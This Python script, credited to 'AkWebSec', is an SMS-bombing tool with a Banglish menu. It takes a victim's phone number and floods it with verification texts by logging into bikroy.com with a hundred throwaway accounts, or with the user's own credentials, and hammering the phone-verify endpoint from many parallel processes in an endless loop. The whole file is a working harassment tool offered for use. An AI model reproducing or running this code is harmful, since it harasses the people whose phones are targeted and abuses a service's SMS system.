# This Program Created By Ali Khan ( AkWebSec )
# IF You Are A Programmeer YOU Can Modify It 
import datetime
import random
import requests
import sys
from colorama import Fore, init
from multiprocessing import *
import time
import os

init(autoreset=True)

aa = Fore.RED
bb = Fore.GREEN
cc = Fore.YELLOW
dd = Fore.BLUE
ee = Fore.MAGENTA
ff = Fore.CYAN
gg = Fore.WHITE

colorlist = [aa, bb, cc, dd, ee, ff, gg]

if sys.platform.startswith('win'):
    os.system('cls')
else:
    os.system('clear')


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
        ________________________________________________________                                                                                                                                                                           
        |||||||||||||||||||||||||||||||||||||||||||||||||||||||||                                                                                                                                                                          
        |                           (1337)                      |                                                                                                                                                                          
        |                         &&HACKER@&                    |                                                                                                                                                                          
        |                        @&&&&&@@@@@&/                  |                                                                                                                                                                          
        |                        @@@&%&&&&@&&&                  |                                                                                                                                                                          
        |                        &%@@@&&%%&(&                   |                                                                                                                                                                          
        | Ali Khan Bangladesh     ((//(****/                    |                                                                                                                                                                          
        |  Call Dis Na Vai         #((%(*/(/                    |                                                                                                                                                                          
        |    KIRE VAI  ????        (&#(//(#*                    |                                                                                                                                                                          
        |                       //(***#((/,,****                |                                                                                                                                                                          
        |                   **********************,,            |                                                                                                                                                                          
        |                  */*Security/.*****,,,***,,           |                                                                                                                                                                          
        |                 *///*********,,**,.,**,**,,           |                                                                                                                                                                          
        |                *****#//***************/***,,          | 
        | FACEBOOK.COM/    #(/(((*****LOVE,*****/**/..          |      
        |  akwebsec.tk     #((*#/*/**INFO**,**,*,(/(            |     
        |                 (#(( #/(***019++8009** #(((           |     
        |    LIKE         (((( /(///*******SEC** ##(/           |     
        |    DILE        #((# #////**RR******** %#((            |    
        |    TO           #((/,//////***DEAD****.%#((           |     
        |    TAKA         %(# ///ALI//KHAN/******##((           |     
        |    LAGE         %(# (////////*/*///*****#(            |     
        |    NA           %(  (///ART//////////**%((            |  
        |                %(( (/////////SHANTO**/&(((            |    
        |                 %((, @@@@CODING@@@@@@%((((            |     
        |   GITHUB/       ((&# @@@@@@@000000@@@@(@((/           |     
        |  AKWeBSeC             &&&&@@@ || @@@@@@##&            |       
        |                       &%%&@@@ || @@@@&%%&             |    
        |                               ||                      |
        |||||||||||||||||||||||||||||||||||||||||||||||||||||||||
"""

    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)


now = datetime.datetime.now()
print('\n\033[92m                  STARTED AT: ' + str(now))

print_logo()

account = str(input(Fore.RED + "(1) --> Amar Bikroy.com Ar Account NAI | SHORASHIRI CHALU KORUN \n" +
                    Fore.GREEN + "(2) --> Amar Bikroy.con Ar Account Ache | Login Korun \n" +
                    Fore.WHITE + "(3) --> Software Ta Notun Korun\n" +
                    Fore.MAGENTA + "(4) --> Developer ar shomporke janun\n" +
                    Fore.LIGHTBLUE_EX + "(5) --> BIDAI NIN ( EXIT )\n\n" +
                    Fore.CYAN + "ACCOUNT NA THAKLE 1 CHAPUN AR THAKLE 2 CHAPUN : "
                    ))

if str(1) in account:
    try:
        print(random.choice(colorlist) + "\nOK THIK ACHE  KICHUKHON WAIT KORUN : ")
        time.sleep(2)
        hacker = input(random.choice(
            colorlist) + "\nJAKE AKROMON KORBEN TAR NUMBER TA DIN \n11 DIGIT HOTE HOBE 0 THEKE SHURU HOBE  : ")


        def Attacker():
            while True:
                data = [

                    "akwebsecbd0@yabaa.org",
                    "akwebsecbd1@yabaa.org",
                    "akwebsecbd2@yabaa.org",
                    "akwebsecbd3@yabaa.org",
                    "akwebsecbd4@yabaa.org",
                    "akwebsecbd5@yabaa.org",
                    "akwebsecbd6@yabaa.org",
                    "akwebsecbd7@yabaa.org",
                    "akwebsecbd8@yabaa.org",
                    "akwebsecbd9@yabaa.org",
                    "akwebsecbd10@yabaa.org",
                    "akwebsecbd11@yabaa.org",
                    "akwebsecbd12@yabaa.org",
                    "akwebsecbd13@yabaa.org",
                    "akwebsecbd14@yabaa.org",
                    "akwebsecbd15@yabaa.org",
                    "akwebsecbd16@yabaa.org",
                    "akwebsecbd17@yabaa.org",
                    "akwebsecbd18@yabaa.org",
                    "akwebsecbd19@yabaa.org",
                    "akwebsecbd20@yabaa.org",
                    "akwebsecbd21@yabaa.org",
                    "akwebsecbd22@yabaa.org",
                    "akwebsecbd23@yabaa.org",
                    "akwebsecbd24@yabaa.org",
                    "akwebsecbd25@yabaa.org",
                    "akwebsecbd26@yabaa.org",
                    "akwebsecbd27@yabaa.org",
                    "akwebsecbd28@yabaa.org",
                    "akwebsecbd29@yabaa.org",
                    "akwebsecbd30@yabaa.org",
                    "akwebsecbd31@yabaa.org",
                    "akwebsecbd32@yabaa.org",
                    "akwebsecbd33@yabaa.org",
                    "akwebsecbd34@yabaa.org",
                    "akwebsecbd35@yabaa.org",
                    "akwebsecbd36@yabaa.org",
                    "akwebsecbd37@yabaa.org",
                    "akwebsecbd38@yabaa.org",
                    "akwebsecbd39@yabaa.org",
                    "akwebsecbd40@yabaa.org",
                    "akwebsecbd41@yabaa.org",
                    "akwebsecbd42@yabaa.org",
                    "akwebsecbd43@yabaa.org",
                    "akwebsecbd44@yabaa.org",
                    "akwebsecbd45@yabaa.org",
                    "akwebsecbd46@yabaa.org",
                    "akwebsecbd47@yabaa.org",
                    "akwebsecbd48@yabaa.org",
                    "akwebsecbd49@yabaa.org",
                    "akwebsecbd50@yabaa.org",
                    "akwebsecbd51@yabaa.org",
                    "akwebsecbd52@yabaa.org",
                    "akwebsecbd53@yabaa.org",
                    "akwebsecbd54@yabaa.org",
                    "akwebsecbd55@yabaa.org",
                    "akwebsecbd56@yabaa.org",
                    "akwebsecbd57@yabaa.org",
                    "akwebsecbd58@yabaa.org",
                    "akwebsecbd59@yabaa.org",
                    "akwebsecbd60@yabaa.org",
                    "akwebsecbd61@yabaa.org",
                    "akwebsecbd62@yabaa.org",
                    "akwebsecbd63@yabaa.org",
                    "akwebsecbd64@yabaa.org",
                    "akwebsecbd65@yabaa.org",
                    "akwebsecbd66@yabaa.org",
                    "akwebsecbd67@yabaa.org",
                    "akwebsecbd68@yabaa.org",
                    "akwebsecbd69@yabaa.org",
                    "akwebsecbd70@yabaa.org",
                    "akwebsecbd71@yabaa.org",
                    "akwebsecbd72@yabaa.org",
                    "akwebsecbd73@yabaa.org",
                    "akwebsecbd74@yabaa.org",
                    "akwebsecbd75@yabaa.org",
                    "akwebsecbd76@yabaa.org",
                    "akwebsecbd77@yabaa.org",
                    "akwebsecbd78@yabaa.org",
                    "akwebsecbd79@yabaa.org",
                    "akwebsecbd80@yabaa.org",
                    "akwebsecbd81@yabaa.org",
                    "akwebsecbd82@yabaa.org",
                    "akwebsecbd83@yabaa.org",
                    "akwebsecbd84@yabaa.org",
                    "akwebsecbd85@yabaa.org",
                    "akwebsecbd86@yabaa.org",
                    "akwebsecbd87@yabaa.org",
                    "akwebsecbd88@yabaa.org",
                    "akwebsecbd89@yabaa.org",
                    "akwebsecbd90@yabaa.org",
                    "akwebsecbd91@yabaa.org",
                    "akwebsecbd92@yabaa.org",
                    "akwebsecbd93@yabaa.org",
                    "akwebsecbd94@yabaa.org",
                    "akwebsecbd95@yabaa.org",
                    "akwebsecbd96@yabaa.org",
                    "akwebsecbd97@yabaa.org",
                    "akwebsecbd98@yabaa.org",
                    "akwebsecbd99@yabaa.org",

                ]
                for x in data:

                    r = requests.Session()

                    bikroy = "https://bikroy.com/data/sessions"

                    data = {"session": {"identifier": x, "password": "123456"}}

                    f = r.post(bikroy, json=data)

                    send = "https://bikroy.com/en/post-ad/phone-verify"

                    databd = {
                        "phone": str(hacker)
                    }

                    dbsql = r.post(send, json=databd)

                    if "SMS sent to" in dbsql.text:
                        print(random.choice(colorlist) + "OK SMS GIACHE ")
                    else:
                        print(random.choice(colorlist) + " NA SMS JAI Ni WAIT  ")


        while True:
            p1 = Process(target=Attacker)
            p2 = Process(target=Attacker)
            p3 = Process(target=Attacker)
            p4 = Process(target=Attacker)
            p5 = Process(target=Attacker)
            p6 = Process(target=Attacker)
            p1.start()
            time.sleep(2)
            p2.start()
            time.sleep(2)
            p3.start()
            time.sleep(2)
            p4.start()
            time.sleep(2)
            p5.start()
            time.sleep(2)
            p6.start()
            time.sleep(2)

    except KeyboardInterrupt:
        print(random.choice(colorlist) + "\n\nBONDHO HOYE GECHE ^C THIK ACHE HAPPY THAKBEN ")
        pass
    except:
        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
        pass
elif str(2) in account:
    try:
        print(random.choice(colorlist) + "\nAPNAR ACCOUNT ER INFORMATION DIN :")
        username = str(input(random.choice(colorlist) + "Akhane Bikroy.com ar username den : "))
        password = str(input(random.choice(colorlist) + "Akhane Bikroy.com ar password den : "))
        print(random.choice(colorlist) + "LOGIN KORA HOCCHE PLEASE WAIT .... ")
        time.sleep(2)
        accountnai = input(random.choice(
            colorlist) + "\n\nABAR JAKE AKROMON KORBEN TAR NUMBER TA DIN \n11 DIGIT HOTE HOBE 0 THEKE SHURU HOBE  : ")


        def Exploit():
            r = requests.Session()

            bikroy = "https://bikroy.com/data/sessions"

            data = {"session": {"identifier": str(username), "password": str(password)}}

            f = r.post(bikroy, json=data)

            send = "https://bikroy.com/en/post-ad/phone-verify"

            databd = {
                "phone": str(accountnai)
            }

            dbsql = r.post(send, json=databd)

            if "SMS sent to" in dbsql.text:
                print(random.choice(colorlist) + "OK SMS GIACHE ")
            else:
                print(random.choice(colorlist) + " NA SMS JAI Ni WAIT  ")


        while True:
            r1 = Process(target=Exploit)
            r2 = Process(target=Exploit)
            r3 = Process(target=Exploit)
            r4 = Process(target=Exploit)
            r5 = Process(target=Exploit)
            r6 = Process(target=Exploit)
            r1.start()
            time.sleep(2)
            r2.start()
            time.sleep(2)
            r3.start()
            time.sleep(2)
            r4.start()
            time.sleep(2)
            r5.start()
            time.sleep(2)
            r6.start()
            time.sleep(2)
    except KeyboardInterrupt:
        print(random.choice(colorlist) + "\n\nBONDHO HOYE GECHE ^C THIK ACHE HAPPY THAKBEN ")
        pass
    except:
        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
        pass

elif str(3) in account:
    try:
        update = requests.get('https://raw.githubusercontent.com/akwebsec/SmsBlaster/main/update.txt')
        notun = update.text
        if "Update Now !!" in notun:
            print(random.choice(colorlist) + "UPDATE ACHE UPDATE TA DOWNLOAD KORE NIN  \n\n")
            print(notun)
        else:
            print(random.choice(colorlist) + "APATOTO KONO UPDATE NAI ALI KHAN ER SHATHE JOGAJOG KORTE PAREN ")

    except:
        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
        pass

elif str(4) in account:
    print(random.choice(
        colorlist) + "\n\n --> AMI ALI KHAN AMI AKJON BUG BOUNTY HUNTER AMAR 16 BOSOR . AMI AKJON COMPUTER SCEINCE STUDENT \nABON AMI AKJON SOFTWARE DEVELOPER AMI DIRGHO 3 BOSORERO BESHI SHOMOY DHORE \nWEB APPICATION DESKTOP APPLICATION ER SOFTWARE \nTOIRI KORE ASHCHI > AMI MULOTO CYBER SECURITY NIA KAJ KORE THAKI > AMI AI SOFTWARE TA BANGLAI LAKHAR \nKARON HOCCHE ONEKE AMAKE REQUEST KORECHILO TAI KEO ABAR ATA NIA MOJA NIBEN NA PLEASE > AR AMAR JONNO DUA \nKORBEN ABON NOTUN NOTUN SOFTWARE PETE AMAR FACEBOOK PAGE TI LIKE \nDITE VULBEN NA INSHAALLAH OK SHOBAI VALO THAKBEN <-- ")

elif str(5) in account:
    print(random.choice(colorlist) + "\nAMAR SOFTWARE TA BEBOHAR KORAR JONNO DHONNOBAT ")
    time.sleep(2)
    sys.exit(1)
else:
    try:
        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
    except:
        pass
    finally:
        print(random.choice(colorlist) + "KONO AKTA SOMOSHSHA HOYECHE PORE TRY KORUN ")
        pass

